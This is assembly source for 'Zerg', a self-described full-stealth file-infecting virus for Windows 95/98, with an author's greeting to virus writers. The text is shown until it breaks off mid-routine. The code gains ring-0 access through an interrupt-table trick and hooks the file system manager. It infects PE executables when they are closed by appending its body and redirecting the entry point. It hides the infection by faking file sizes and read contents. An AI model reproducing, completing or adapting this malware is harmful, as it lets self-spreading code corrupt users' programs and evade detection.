컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�[Zerg.asm]컴�

infected_sign   =       'DS'

; for test
remove_sign     equ     'BYE'

include         vxd.inc
include         vmm.inc
include         ifs.inc
include         ifsext.inc
include         filehead.inc
include         Zerg.inc

vir_size        equ     (vir_end-start)
vir_file_size   equ     (vir_file_end-start)
vir_mem_size    equ     (vir_mem_end-start)

                .386p
                .model  flat
                .code

start:          push    dword ptr 0     ; for return host
                pushfd
                pushad
run_host:       call    _delta
_delta:         pop     ecx
                sub     ecx,_delta-start
                xor     ecx,eax
                jecxz   under_win95
                xor     ecx,eax
                mov     eax,-(ret_-start)
vir_entry_point equ     dword ptr ($-4)
                neg     eax
                add     eax,ecx
                add     eax,ds:[host_data ptr (ecx+HostData-start).pe_inhs. \
                                  OptionalHeader.AddressOfEntryPoint]
                mov     ss:[pfad ptr esp.pfad_eax],eax
                mov     ss:[pfad ptr esp.pfad_ret],eax
                popad
                popfd
ret_:           ret

seh:            xor     ecx,ecx
                mov     ebx,fs:[ecx]
                mov     esp,ds:[ebx]
remove_seh:     pop     dword ptr fs:[ecx]
                pop     eax
                jmp     run_host

under_win95:    lea     ebx,[seh+eax-start]
                push    ebx
                push    dword ptr fs:[ecx]
                mov     fs:[ecx],esp

                push    eax
                sidt    fword ptr ss:[esp-2]
                pop     ebx
                lea     edx,[int0+eax-start]
                ror     edx,16
                xchg    dx,ds:[ebx+6]
                ror     edx,16
                xchg    dx,ds:[ebx]
                div     cl
                jmp     remove_seh


msg             db      ' -=#[Zerg v0.1 Beta]#=- '
                db      'The World First Full Stealth virus for Win95/98, '
                db      'Written by Dark Slayer in Keelung, Taiwan (ROC). '
                db      'This is a Demo and Lame virus. '
                db      "It's Show that How to Make a Full Stealth virus on "
                db      'IFSMgr, and Directly Call into FSD '
                db      'without the Fucking IFSMgr_Ring0_FileIO. '
                db      "It's not Finished yet at All, "
                db      'Keeping watch My Next virus, Next Generation... '
                db      "It'll be A Partition/BOOT/COM/EXE/NEXE/PEXE/"
                db      'Polymorphic/Full Stealth/Multi-Platform Infector. '
                db      'Greeting to all Virus Writer, '
                db      'Bye! ^_^ '


int0:           pushad
                push    ds es
                push    ss ss
                pop     ds es

                mov     ds:[ebx],dx
                ror     edx,16
                mov     ds:[ebx+6],dx

                xchg    esi,eax

                push    vir_mem_size
VxDCall0:       VxDCall IFSMgr_GetHeap
                pop     ecx
                or      eax,eax
                jz      int0_exit

                xchg    edi,eax
                cld
                rep     movsb

                lea     eax,[edi-vir_mem_size+IFSHook-start]
                push    eax
VxDCall1:       VxDCall IFSMgr_InstallFileSystemApiHook
                pop     ebx
                or      eax,eax
                jz      int0_retHeap_exit
                mov     ds:[edi-vir_mem_size+prevIFSHookAddr-start],eax

                lea     eax,[edi-vir_mem_size+IFSMgrIFSApiHook-start]
                mov     ebx,ds:[esi-vir_mem_size+VxDCall1+2-start]
                xchg    eax,ds:[ebx]
                mov     ds:[edi-vir_mem_size+IFSMgrIFSApiHookAddr-start],eax


                ; follow line for test remove function
                ;mov     ds:[edi-vir_mem_size+remove_addr-start],ebx


int0_exit:      pop     es ds
                popad
                add     dword ptr ss:[esp],2
                iretd

int0_retHeap_exit:
                sub     edi,vir_mem_size
                push    edi
VxDCall2:       VxDCall IFSMgr_RetHeap
                pop     eax
                jmp     int0_exit


IFSMgrIFSApiHook:
                push    ebx ecx


                ; for test
                mov     ebx,ss:[esp+3*4]
                cmp     dword ptr ss:[ebx-4],remove_sign
                jne     not_remove
                call    _deltaX
_deltaX:        pop     ebx

;                mov     ecx,0
;remove_addr     =       dword ptr $-4
;                mov     eax,ds:[ebx+IFSMgrIFSApiHookAddr-_deltaX]
;                mov     ds:[ecx],eax

                lea     eax,[ebx+IFSHook-_deltaX]
                push    eax
                VxDCall IFSMgr_RemoveFileSystemApiHook
                pop     eax
                mov     eax,remove_sign
                jmp     IFSMgrIFSApiHookRet
not_remove:


                mov     ebx,ss:[esp+3*4]
                cmp     dword ptr ss:[ebx-4],infected_sign
                jne     not_me
                xor     eax,eax
                jmp     IFSMgrIFSApiHookRet

not_me:         call    _delta1
_delta1:        pop     ebx
                lea     eax,[ebx+IFSHook-_delta1]
                push    eax
VxDCall3:       VxDCall IFSMgr_RemoveFileSystemApiHook
                mov     ebx,0
IFSMgrIFSApiHookAddr =  dword ptr $-4
                push    dword ptr ss:[esp+4*4]
                call    ebx
                pop     ecx
                pop     ecx
                push    eax
                push    ecx
                call    ebx
                pop     ebx
                mov     ds:[ebx+prevIFSHookAddr-IFSHook],eax
                pop     eax
IFSMgrIFSApiHookRet:
                pop     ecx ebx
                ret


tsr_sign        dd      infected_sign

IFSHook         proc    c,FSDFnAddr:dword,FunctionNum:dword,Drive:dword, \
                          ResourceFlags:dword,CodePage:dword,pir:dword
                local   pifshp:dword
                pushfd
                pushad
                mov     ss:pifshp,0

                mov     eax,ss:FunctionNum
                cmp     al,IFSFN_CLOSE          ; infect
                je      FuncCloseFile
                cmp     al,IFSFN_FINDOPEN       ; stealth size
                je      FuncFindFile
                cmp     al,IFSFN_FINDNEXT       ; stealth size
                je      FuncFindFile
                cmp     al,IFSFN_READ           ; stealth data
                je      FuncReadFile
                cmp     al,IFSFN_WRITE          ; disinfect file
                je      FuncWriteFile
                cmp     al,IFSFN_OPEN        ; stealth size & modify open mode
                je      FuncOpenFile
                cmp     al,IFSFN_SEARCH         ; stealth size
                je      FuncSearchFile
                cmp     al,IFSFN_SEEK           ; stealth size
                je      FuncFileSeek
                cmp     al,IFSFN_ENUMHANDLE     ; stealth size
                je      FuncEnumerateHandle

toNextIFSHook:  call    RetIfshp
                popad
                popfd
                call    prevIFSHook
                ret

returnIFSHook:  call    RetIfshp
                popad
                popfd
                ret
IFSHook         endp


prevIFSHook:    pushfd
                pushad
                mov     eax,0
prevIFSHookAddr =       dword ptr $-4
                call    [eax] c,FSDFnAddr,FunctionNum,Drive, \
                                ResourceFlags,CodePage,pir
                mov     ss:[pfad ptr esp.pfad_eax],eax
                popad
                popfd
                ret


FuncWriteFile:  call    GetIfshp
                jc      toNextIFSHook

                xchg    edi,eax
                lea     ebx,[ifshp ptr edi.our_ifsreq]
                call    CheckHandle
                jc      toNextIFSHook
                or      eax,eax
                jz      toNextIFSHook

                call    WriteInfectedData
                jmp     toNextIFSHook


FuncEnumerateHandle:
                mov     ecx,ss:pir
                cmp     ds:[ioreq ptr ecx.ir_flags],ENUMH_GETFILEINFO
                jne     toNextIFSHook

                call    GetIfshp
                jc      toNextIFSHook

                xchg    edi,eax
                lea     ebx,[ifshp ptr edi.our_ifsreq]
                call    CheckHandle
                jc      toNextIFSHook
                or      eax,eax
                jz      toNextIFSHook

                call    prevIFSHook
                mov     ss:[pfad ptr esp.pfad_eax],eax
                movzx   eax,ds:[ioreq ptr ecx.ir_error]
                or      eax,eax
                jnz     returnIFSHook

                mov     edx,ds:[ioreq ptr ecx.ir_data]
                mov     eax,ds:[ifshp ptr edi.hdat.FileSize]
                mov     ds:[_BY_HANDLE_FILE_INFORMATION ptr edx. \
                                                        bhfi_nFileSizeLow],eax
                jmp     returnIFSHook


FuncFileSeek:   mov     ecx,ss:pir
                cmp     ds:[ioreq ptr ecx.ir_flags],FILE_END
                jne     toNextIFSHook

                call    GetIfshp
                jc      toNextIFSHook

                xchg    edi,eax
                lea     ebx,[ifshp ptr edi.our_ifsreq]
                call    CheckHandle
                jc      toNextIFSHook
                or      eax,eax
                jz      toNextIFSHook

                mov     ds:[ioreq ptr ecx.ir_flags],FILE_BEGIN
                mov     eax,ds:[ifshp ptr edi.hdat.FileSize]
                add     ds:[ioreq ptr ecx.ir_pos],eax

                call    prevIFSHook
                mov     ss:[pfad ptr esp.pfad_eax],eax
                movzx   eax,ds:[ioreq ptr ecx.ir_error]
                or      eax,eax
                jnz     returnIFSHook

                mov     ds:[ioreq ptr ecx.ir_flags],FILE_END
                jmp     returnIFSHook


FuncSearchFile: call    prevIFSHook
                mov     ss:[pfad ptr esp.pfad_eax],eax
                mov     eax,ss:pir
                movzx   eax,ds:[ioreq ptr eax.ir_error]
                or      eax,eax
                jnz     returnIFSHook

                call    GetIfshp
                jc      returnIFSHook

                xchg    edi,eax
                lea     ebx,[ifshp ptr edi.our_ifsreq]
                mov     eax,ds:[ioreq ptr ebx.ir_data]
                test    ds:[srch_entry ptr eax.se_attrib], \
                          FILE_ATTRIBUTE_LABEL or FILE_ATTRIBUTE_DIRECTORY or \
                          FILE_ATTRIBUTE_DEVICE
                jnz     returnIFSHook

                lea     eax,[srch_entry ptr eax.se_name]
                mov     ds:[ioreq ptr ebx.ir_data],eax
                lea     eax,[ifshp ptr edi.UniPath]
                mov     ds:[ioreq ptr ebx.ir_ppath],eax
                mov     ds:[ifsreq ptr ebx.ifs_pbuffer],eax
                mov     ds:[ifsreq ptr ebx.ifs_nflags],BCS_OEM
                push    ebx
VxDCall8:       VxDCall IFSMgr_ParsePath
                pop     ebx
                movzx   eax,ds:[ioreq ptr ebx.ir_error]
                or      eax,eax
                jnz     returnIFSHook

                mov     al,ACCESS_READONLY or SHARE_DENYNONE
                call    OpenFile
                jc      returnIFSHook

                call    CheckHandle
                jc      SearchCloseFile
                or      eax,eax
                jz      SearchCloseFile

                mov     ecx,ss:pir
                mov     eax,ds:[ioreq ptr ecx.ir_data]
                mov     edx,ds:[ifshp ptr edi.hdat.FileSize]
                mov     ds:[srch_entry ptr eax.se_size],edx

SearchCloseFile:call    CloseFile
                jmp     returnIFSHook


FuncFindFile:   call    prevIFSHook
                mov     ss:[pfad ptr esp.pfad_eax],eax
                mov     eax,ss:pir
                movzx   eax,ds:[ioreq ptr eax.ir_error]
                or      eax,eax
                jnz     returnIFSHook

                call    GetIfshp
                jc      returnIFSHook

                xchg    edi,eax
                lea     ebx,ds:[ifshp ptr edi.our_ifsreq]
                mov     eax,ds:[ioreq ptr ebx.ir_data]
                test    ds:[_WIN32_FIND_DATA ptr eax.dwFileAttributes], \
                          FILE_ATTRIBUTE_LABEL or FILE_ATTRIBUTE_DIRECTORY or \
                          FILE_ATTRIBUTE_DEVICE
                jnz     returnIFSHook

                lea     eax,[ifshp ptr edi.UniPath]
                call    GetFindInfoByHandle
                jc      returnIFSHook

FuncFindOpen:   mov     al,ACCESS_READONLY or SHARE_DENYNONE
                call    OpenFile
                jc      returnIFSHook

                call    CheckHandle
                jc      FindCloseFile
                or      eax,eax
                jz      FindCloseFile

                mov     ecx,ss:pir
                mov     edx,ds:[ifshp ptr edi.hdat.FileSize]
                mov     eax,ds:[ioreq ptr ecx.ir_data]
                mov     ds:[_WIN32_FIND_DATA ptr eax.nFileSizeLow],edx

FindCloseFile:  call    CloseFile
                jmp     returnIFSHook


FuncOpenFile:   mov     ecx,ss:pir
                test    ds:[ioreq ptr ecx.ir_options],ACTION_OPENEXISTING
                jz      toNextIFSHook
                mov     al,ds:[ioreq ptr ecx.ir_flags]
                and     al,ACCESS_MODE_MASK
                cmp     al,ACCESS_WRITEONLY
                jne     DoOpenFile
                or      al,ACCESS_READWRITE
                xor     ds:[ioreq ptr ecx.ir_flags],al
DoOpenFile:     call    prevIFSHook
                mov     ss:[pfad ptr esp.pfad_eax],eax
                movzx   eax,ds:[ioreq ptr ecx.ir_error]
                or      eax,eax
                jnz     returnIFSHook

                cmp     ds:[ioreq ptr ecx.ir_options],ACTION_OPENED
                jne     returnIFSHook

                call    GetIfshp
                jc      returnIFSHook

                xchg    edi,eax
                lea     ebx,[ifshp ptr edi.our_ifsreq]
                call    CheckHandle
                jc      returnIFSHook
                or      eax,eax
                jz      returnIFSHook

                mov     eax,ds:[ifshp ptr edi.hdat.FileSize]
                mov     ds:[ioreq ptr ecx.ir_size],eax
                jmp     returnIFSHook


FuncReadFile:   call    GetIfshp
                jc      toNextIFSHook

                xchg    edi,eax
                lea     ebx,[ifshp ptr edi.our_ifsreq]
                call    CheckHandle
                jc      toNextIFSHook
                or      eax,eax
                jz      toNextIFSHook

                mov     ecx,ss:pir
                mov     edx,ds:[ioreq ptr ecx.ir_pos]
                sub     edx,ds:[ifshp ptr edi.hdat.FileSize]
                jb      ReadPosInFile
                xor     edx,edx
                jmp     DoRead
ReadPosInFile:  neg     edx
DoRead:         cmp     edx,ds:[ifshp ptr ecx.ir_length]
                jbe     FixReadSize
                mov     edx,ds:[ifshp ptr ecx.ir_length]
FixReadSize:    xchg    edx,ds:[ifshp ptr ecx.ir_length]

                mov     ebx,ds:[ioreq ptr ecx.ir_data]
                mov     esi,ds:[ioreq ptr ecx.ir_pos]
                call    prevIFSHook
                mov     ss:[pfad ptr esp.pfad_eax],eax
                movzx   eax,ds:[ioreq ptr ecx.ir_error]
                or      eax,eax
                jz      StealthReadData
                mov     ds:[ifshp ptr ecx.ir_length],edx
                jmp     returnIFSHook

StealthReadData:mov     edx,esi
                lea     esi,[ifshp ptr edi.hdat.eh_st]
                mov     edi,ebx
                mov     ecx,ds:[ioreq ptr ecx.ir_length]

                cld
ReadStealthLoop:or      ecx,ecx
                jz      returnIFSHook
                xor     eax,eax
                lodsw           ; load st_size
                or      eax,eax
                jz      returnIFSHook
                xchg    ebx,eax
                lodsd           ; load_st_pt
                xchg    ebx,eax ; eax = st_size, ebx = st_pt

                sub     ebx,edx
                jbe     DoStealthData
                sub     ecx,ebx
                jbe     returnIFSHook
                add     edx,ebx
                add     edi,ebx
                xor     ebx,ebx
DoStealthData:  push    esi
                sub     esi,ebx
                add     ebx,eax
                js      DoNextStealthData
                jz      DoNextStealthData

                push    ecx
                cmp     ebx,ecx
                jbe     MoveStealthData
                mov     ebx,ecx
MoveStealthData:mov     ecx,ebx
                rep     movsb
                pop     ecx
                sub     ecx,ebx
                add     edx,ebx

DoNextStealthData:
                pop     esi
                add     esi,eax
                jmp     ReadStealthLoop


FuncCloseFile:  call    GetIfshp
                jc      toNextIFSHook

                lea     ebx,ds:[ifshp ptr eax.our_ifsreq]
                lea     esi,ds:[ifshp ptr eax.UniPath]
                mov     ecx,size szPathName
                lea     edi,ds:[ifshp ptr eax.szPathName]
                call    GetFileNameByHandle
                jc      toNextIFSHook
                mov     edi,ss:pifshp
                mov     ds:[ifshp ptr edi.PathNameSize],eax

                lea     ecx,ds:[ifshp ptr edi.szPathName+eax]
                mov     eax,ds:[ecx-4]  ; get extend name
                or      eax,20202000h   ; lower case
                cmp     eax,'exe.'
                ;jne     toNextIFSHook

                call    prevIFSHook
                mov     ss:[pfad ptr esp.pfad_eax],eax
                mov     eax,ss:pir
                movzx   eax,ds:[ioreq ptr eax.ir_error]
                or      eax,eax
                jnz     returnIFSHook

                mov     edi,ss:pifshp
                lea     ebx,ss:[ifshp ptr edi.our_ifsreq]
                mov     al,ACCESS_READONLY or SHARE_DENYNONE
                call    OpenFile
                jc      returnIFSHook

                mov     eax,ds:[ioreq ptr ebx.ir_attr]
                mov     ds:[ifshp ptr edi.FileAttributes],eax
                mov     eax,ds:[ioreq ptr ebx.ir_dostime]
                mov     ds:[ifshp ptr edi.FileDateTime],eax
                mov     eax,ds:[ioreq ptr ebx.ir_size]
                mov     ds:[ifshp ptr edi.hdat.FileSize],eax

                call    InfectHandle
                pushfd
                call    CloseFile
                pop     eax
                jc      returnIFSHook
                test    eax,CFbit
                jnz     returnIFSHook

                mov     eax,ds:[ifshp ptr edi.FileAttributes]
                and     eax,not FILE_ATTRIBUTE_READONLY
                call    SetFileAttributes
                jc      returnIFSHook

                mov     al,ACCESS_READWRITE or SHARE_DENYREADWRITE
                call    OpenFile
                jc      restoreFileAttr

                call    WriteInfectedData

                mov     eax,ds:[ifshp ptr edi.FileDateTime]
                call    SetFileDateTime
                call    CloseFile

restoreFileAttr:mov     eax,ds:[ifshp ptr edi.FileAttributes]
                call    SetFileAttributes
                jmp     returnIFSHook


WriteInfectedData:
                stc
                pushfd
                pushad

                mov     edi,ss:pifshp
                lea     ebx,ss:[ifshp ptr edi.our_ifsreq]

                lea     esi,[ifshp ptr edi.hdat.eh_st+size st]
write_loop:     movzx   ecx,ds:[st ptr (esi-size st).st_size]
                jcxz    write_body
                mov     edx,ds:[st ptr (esi-size st).st_pt]
                call    WriteFile
                jc      WriteInfectedDataErr
                cmp     eax,ecx
                jne     WriteInfectedDataErr
                lea     esi,[esi+eax+size st]
                jmp     write_loop

write_body:     mov     ecx,vir_file_size
                lea     esi,[ifshp ptr edi.VirData]
                cmp     dword ptr ds:[esi],0
                je      for_disinfect
                mov     edx,ds:[host_data ptr (esi+HostData-start).FileSize]
                call    WriteFile
                jc      WriteInfectedDataErr
                cmp     eax,ecx
                jne     WriteInfectedDataErr

for_disinfect:  xor     ecx,ecx
                mov     edx,ds:[ifshp ptr edi.hdat.FileSize]
                call    WriteFile
                jc      WriteInfectedDataErr
                cmp     eax,ecx
                jne     WriteInfectedDataErr

                and     ss:[pfad ptr esp.pfad_eflags],not CFbit
WriteInfectedDataErr:
                popad
                popfd
                ret


; infect file by handle
;   entry:
;     ebx = pointer to the ifsreq
InfectHandle:   clc
                pushfd
                pushad

                call    CheckHandle
                jc      InfectHandleErr ; error
                or      eax,eax
                jnz     InfectHandleErr

                mov     edi,ss:pifshp
                cmp     ds:[ifshp ptr edi.eh.eh_sign],IMAGE_DOS_SIGNATURE
                jne     InfectHandleErr ; checks for 'MZ' sign

                mov     ecx,size pe_inhs
                mov     edx,ds:[ifshp ptr edi.hdat.eh.eh_neh_ofs]
                lea     esi,ds:[ifshp ptr edi.hdat.pe_inhs]
                call    SetST&ReadFile
                jc      InfectHandleErr
                cmp     eax,ecx
                jne     InfectHandleErr

                cmp     ds:[pe_inhs ptr esi.Signature],IMAGE_NT_SIGNATURE
                jne     InfectHandleErr ; chkecks for 'PE' sign

                call    InfectPEXE
                jnc     InfectHandleOk
InfectHandleErr:or      ss:[pfad ptr esp.pfad_eflags],CFbit
InfectHandleOk: popad
                popfd
                ret


; infect Portable Executable file by handle
;   entry:
;     ebx = pointer to the ifsreq
InfectPEXE:     clc
                pushfd
                pushad

                mov     edi,ss:pifshp
                cmp     ds:[ifshp ptr edi.hdat.pe_inhs.FileHeader.Machine], \
                          IMAGE_FILE_MACHINE_I386    ; checks for 386 platform
                jne     InfectPExeErr

                mov     ax,ds:[ifshp ptr edi.hdat.pe_inhs.FileHeader. \
                                                            Characteristics]
                test    ax,IMAGE_FILE_SYSTEM or \
                           IMAGE_FILE_DLL       ; checks for dll or system file
                jnz     InfectPExeErr
                not     eax
                test    ax,IMAGE_FILE_EXECUTABLE_IMAGE or \
                           IMAGE_FILE_32BIT_MACHINE
                jnz     InfectPExeErr

                cmp     ds:[ifshp ptr edi.hdat.pe_inhs.OptionalHeader.Magic], \
                          IMAGE_NT_OPTIONAL_HDR_MAGIC
                jne     InfectPExeErr

                mov     ax,ds:[ifshp ptr edi.hdat.pe_inhs.OptionalHeader. \
                                                            Subsystem]
                cmp     al,IMAGE_SUBSYSTEM_WINDOWS_GUI
                je      SubsystemOK
                cmp     al,IMAGE_SUBSYSTEM_WINDOWS_CUI
                jne     InfectPExeErr   ; neither GUI nor CUI, bye!
SubsystemOK:
                movzx   eax,ds:[ifshp ptr edi.hdat.pe_inhs.FileHeader. \
                                                             NumberOfSections]
                dec     eax
                js      InfectPExeErr
                mov     ecx,size IMAGE_SECTION_HEADER
                mul     ecx
                movzx   edx,ds:[ifshp ptr edi.hdat.pe_inhs.FileHeader. \
                                SizeOfOptionalHeader]
                add     edx,size Signature+size FileHeader
                add     edx,eax
                add     edx,ds:[ifshp ptr edi.hdat.eh.eh_neh_ofs]
                lea     esi,ds:[ifshp ptr edi.hdat.pe.pe_ish]
                call    SetST&ReadFile
                jc      InfectPExeErr
                cmp     eax,ecx
                jne     InfectPExeErr

                mov     ecx,ds:[ifshp ptr edi.hdat.pe_inhs.OptionalHeader. \
                                                             SectionAlignment]
                xor     edx,edx
                mov     eax,ds:[pe_ish ptr esi.Misc.VirtualSize]
                div     ecx
                cmp     edx,1   ; remainder?
                cmc
                adc     eax,0
                mul     ecx
                add     eax,ds:[pe_ish ptr esi.VirtualAddress]
                cmp     eax,ds:[ifshp ptr edi.hdat.pe_inhs.OptionalHeader. \
                                                             SizeOfImage]
                jne     InfectPExeErr

                mov     eax,ds:[pe_ish ptr esi.Misc.VirtualSize]
                sub     eax,ds:[pe_ish ptr esi.SizeOfRawData]
                jae     CheckFileSize
                neg     eax
CheckFileSize:  cmp     eax,ecx
                jae     InfectPExeErr

                mov     eax,ds:[ifshp ptr edi.hdat.FileSize]
                sub     eax,ds:[pe_ish ptr esi.PointerToRawData]
                sub     eax,ds:[pe_ish ptr esi.SizeOfRawData]
                cmp     eax,ecx
                jae     InfectPExeErr

                xor     edx,edx
                mov     eax,ds:[pe_ish ptr esi.VirtualAddress]
                or      eax,eax
                jz      InfectPExeErr
                div     ecx
                or      edx,edx
                jnz     InfectPExeErr

                mov     ecx,ds:[ifshp ptr edi.hdat.pe_inhs.OptionalHeader. \
                                                             FileAlignment]
                mov     eax,ds:[ifshp ptr edi.hdat.FileSize]
                div     ecx
                or      edx,edx
                jnz     InfectPExeErr

                mov     eax,ds:[pe_ish ptr esi.SizeOfRawData]
                or      eax,eax
                jz      InfectPExeErr
                div     ecx
                or      edx,edx
                jnz     InfectPExeErr

                mov     eax,ds:[pe_ish ptr esi.PointerToRawData]
                or      eax,eax
                jz      InfectPExeErr
                div     ecx
                or      edx,edx
                jnz     InfectPExeErr

                mov     eax,ds:[pe_ish ptr esi.SectionCharacteristics]
                test    eax,IMAGE_SCN_CNT_UNINITIALIZED_DATA or \
                            IMAGE_SCN_MEM_16BIT
                jnz     InfectPExeErr

                mov     ds:[ifshp ptr edi.hdat.InfectedSign],infected_sign
                mov     ds:[ifshp ptr edi.hdat.pe_last],0


                xchg    edi,eax
                call    _delta2
_delta2:        pop     esi
                sub     esi,_delta2-start
                lea     edi,[ifshp ptr eax.VirData]
                mov     ecx,vir_size
                cld
                rep     movsb

                mov     ecx,VxDCall_tbl_size/4
patch_VxDCall:  mov     edx,ds:[edi-vir_size+VxDCall_tbl-start+(ecx-1)*4]
                sub     edx,offset start
                mov     word ptr ds:[edi-vir_size+edx],20cdh
                push    dword ptr ds:[edi-vir_size+edx+8]
                pop     dword ptr ds:[edi-vir_size+edx+2]
                loop    patch_VxDCall

                lea     esi,[ifshp ptr eax.hdat]
                mov     cx,size hdat
                rep     movsb
                xchg    edi,eax


                mov     ds:[ifshp ptr edi.hdat.eh.eh_checksum],infected_sign

                mov     eax,ds:[ifshp ptr edi.hdat.FileSize]
                sub     eax,ds:[ifshp ptr edi.hdat.pe_ish.PointerToRawData]
                lea     edx,[eax+vir_file_size]
                mov     ds:[ifshp ptr edi.hdat.pe_ish.Misc.VirtualSize],edx

                add     eax,ds:[ifshp ptr edi.hdat.pe_ish.VirtualAddress]
                mov     ds:[ifshp ptr edi.hdat.pe_inhs.OptionalHeader. \
                                                       AddressOfEntryPoint],eax
                mov     dword ptr ds:[ifshp ptr edi.VirData+vir_entry_point- \
                                                              start],eax

                mov     ecx,ds:[ifshp ptr edi.hdat.pe_inhs.OptionalHeader. \
                                                             SectionAlignment]
                xchg    edx,eax
                xor     edx,edx
                add     eax,ds:[ifshp ptr edi.hdat.pe_ish.VirtualAddress]
                div     ecx
                cmp     edx,1
                cmc
                adc     eax,0
                mul     ecx
                mov     ds:[ifshp ptr edi.hdat.pe_inhs.OptionalHeader. \
                                                         SizeOfImage],eax

                mov     ecx,ds:[ifshp ptr edi.hdat.pe_inhs.OptionalHeader. \
                                                             FileAlignment]
                xor     edx,edx
                mov     eax,ds:[ifshp ptr edi.hdat.pe_ish.Misc.VirtualSize]
               ;div     ecx
               ;cmp     edx,1
               ;cmc
               ;adc     eax,0
               ;mul     ecx
               ; for test bugs
                mov     ds:[ifshp ptr edi.hdat.pe_ish.SizeOfRawData],eax

                add     eax,ds:[ifshp ptr edi.hdat.pe_ish.PointerToRawData]
                mov     ds:[ifshp ptr edi.hdat.FileSize],eax

                or      ds:[ifshp ptr edi.hdat.pe_ish.SectionCharacteristics], \
                          IMAGE_SCN_CNT_CODE or IMAGE_SCN_MEM_EXECUTE or \
                          IMAGE_SCN_MEM_READ
                jmp     InfectPExeOk

InfectPExeErr:  or      ss:[pfad ptr esp.pfad_eflags],CFbit
InfectPExeOk:   popad
                popfd
                ret


; check handle for infected or not
;   entry:
;     ebx = pointer to the ifsreq
;   return:
;     CFlag = 0 (no error)
;       eax == 0 -> not infected
;       eax >  0 -> infected
;     CFlag = 1 (error)
CheckHandle:    clc
                pushfd
                pushad

                mov     ecx,size eh
                xor     edx,edx
                mov     esi,ss:pifshp
                lea     esi,[ifshp ptr esi.hdat.eh]
                call    SetST&ReadFile
                jc      CheckHandleRetC
                sub     eax,ecx
                jnz     CheckHandleRetC

                cmp     ds:[eh ptr esi.eh_checksum],infected_sign
                jne     CheckHandleSaveEAX

                call    GetFileSizeByHandle
                jc      CheckHandleRetC

                mov     ecx,size hdat
                lea     edx,[eax-size hdat]
                lea     esi,[ifshp ptr (esi-hdat.eh).hdat]
                call    ReadFile
                jc      CheckHandleRetC
                cmp     eax,ecx
                jne     CheckHandleRetC

                xor     eax,eax
                cmp     ds:[hdat ptr esi.InfectedSign],infected_sign
                jne     CheckHandleSaveEAX
                inc     eax
CheckHandleSaveEAX:
                mov     ss:[pfad ptr esp.pfad_eax],eax
CheckHandleRet: popad
                popfd
                ret
CheckHandleRetC:or      ss:[pfad ptr esp.pfad_eflags],CFbit
                jmp     CheckHandleRet


; get hndlfunc structure
;   entry:
;     ebx = pointer to the ifsreq
;   return:
;     eax = return the pointer of hndlfunc structure
GetHndlfunc:    mov     eax,ss:pifshp
                or      eax,eax
                jz      GetHndlfuncFromIfsreq
                lea     eax,[ifshp ptr eax.our_hfunc]
                cmp     dword ptr ds:[eax],0
                je      GetHndlfuncFromIfsreq
                ret

GetHndlfuncFromIfsreq:
                mov     eax,ds:[ifsreq ptr ebx.ifs_pfh]
                lea     eax,[fhandle ptr eax.fh_hf]
                ret


; get file size by handle
;   entry:
;     ebx = pointer to the ifsreq
;   return:
;     CFlag = 0 (no error)
;       eax = returns the size of file
;     CFlag = 1 (error)
;       eax = error code
GetFileSizeByHandle:
                pushfd
                pushad
                mov     ds:[ioreq ptr ebx.ir_flags],FILE_END
                mov     ds:[ioreq ptr ebx.ir_pos],0

                call    GetHndlfunc
                mov     eax,ds:[hndlfunc ptr eax.hf_misc]
                push    ebx
                call    ds:[hndlmisc ptr eax.hm_func+HM_SEEK*4]
                pop     ebx

                movzx   eax,ds:[ioreq ptr ebx.ir_error]
                cmp     eax,1
                sbb     ecx,ecx
                inc     ecx
                and     ss:[pfad ptr esp.pfad_eflags],not CFbit
                or      ss:[pfad ptr esp.pfad_eflags],ecx
                dec     ecx
                jz      GetSizeDone

                mov     eax,ds:[ioreq ptr ebx.ir_pos]
GetSizeDone:    mov     ss:[pfad ptr esp.pfad_eax],eax
                popad
                popfd
                ret


; get heap for ifshp
;   return:
;     CFlag = 0 (no error)
;       eax = pointer to the ifshp
;     CFlag = 1 (error)
;       eax = 0
GetIfshp:       pushfd
                pushad
                push    size ifshp
VxDCall4:       VxDCall IFSMgr_GetHeap
                pop     ecx
                or      eax,eax
                jz      GetIfshpDone
                mov     ss:pifshp,eax

                mov     ebx,eax
                xchg    edi,eax
                xor     eax,eax
                cld
                rep     stosb

                mov     esi,pir
                lea     edi,[ifshp ptr ebx.our_ifsreq]
                mov     ecx,size ifsreq
                rep     movsb
GetIfshpDone:   cmp     ss:pifshp,1
                sbb     ecx,ecx
                and     ecx,CFbit
                and     ss:[pfad ptr esp.pfad_eflags],not CFbit
                or      ss:[pfad ptr esp.pfad_eflags],ecx
                popad
                popfd
                mov     eax,ss:pifshp
                ret


; ret heap of ifshp
; return: none
RetIfshp:       pushfd
                pushad
                mov     ecx,ss:pifshp
                jecxz   RetIfshpDone
                push    ecx
VxDCall5:       VxDCall IFSMgr_RetHeap
                pop     ecx
                mov     ss:pifshp,0
RetIfshpDone:   popad
                popfd
                ret


; get find info by handle
;   entry:
;     ebx = pointer to the ifsreq
;     eax = pointer to a buffer the unicode pathname in the ParsedPath
;           structure format is to be returned
;   return:
;     CFlag = 0 (no error)
;       eax = filled in with the unicode pathname in the ParsedPath
;             structure format
;     CFlag = 1 (error)
;       eax = error code
GetFindInfoByHandle:
                pushfd
                pushad
                mov     ds:[ioreq ptr ebx.ir_flags],ENUMH_GETFINDINFO
                mov     ds:[ioreq ptr ebx.ir_ppath],eax

                call    GetHndlfunc
                mov     eax,ds:[hndlfunc ptr eax.hf_misc]
                push    ebx
                call    ds:[hndlmisc ptr eax.hm_func+HM_ENUMHANDLE*4]
                pop     ebx

                movzx   eax,ds:[ioreq ptr ebx.ir_error]
                cmp     eax,1
                sbb     ecx,ecx
                inc     ecx
                and     ss:[pfad ptr esp.pfad_eflags],not CFbit
                or      ss:[pfad ptr esp.pfad_eflags],ecx
                popad
                popfd
                ret


; get file name by handle (enumerate handle)
;   entry:
;     ebx = pointer to the ifsreq
;     esi = pointer to a buffer the unicode pathname in the ParsedPath
;           structure format is to be returned
;     ecx = the maximum length in bytes of the buffer(edi),
;           excluding the NUL character
;     edi = pointer to a buffer the BCS pathname is to be returned
;   return:
;     CFlag = 0 (no error)
;       eax = return the number of bytes in the converted unicode pathname
;       esi = filled in with the unicode pathname in the ParsedPath
;             structure format
;       edi = filled in with the BCS pathname
;     CFlag = 1 (error)
;       eax = error code
GetFileNameByHandle:
                pushfd
                pushad
                mov     ds:[ioreq ptr ebx.ir_flags],ENUMH_GETFILENAME
                mov     ds:[ioreq ptr ebx.ir_ppath],esi

                call    GetHndlfunc
